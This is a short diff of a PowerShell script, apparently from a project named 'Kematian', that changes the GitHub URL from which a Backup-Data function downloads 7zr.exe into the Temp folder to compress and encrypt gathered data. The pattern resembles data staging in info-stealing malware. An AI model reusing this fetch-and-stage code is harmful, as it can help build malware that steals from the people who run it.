@@ -1246,7 +1246,7 @@ function Backup-Data {
     $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"
 
     Write-Host "[!] Compressing and Encrypting With 7zr Tool" -ForegroundColor Green
-    $url = "https://github.com/macedonianlegend/Kematian/raw/main/frontend-src/7zr.exe"
+    $url = "https://github.com/macedonianlegend/Kematian/raw/main/tools/7zr.exe"
     $7zr = "$env:TEMP\7zr.exe"
     $webClient = New-Object System.Net.WebClient
     $webClient.DownloadFile($url, $7zr)
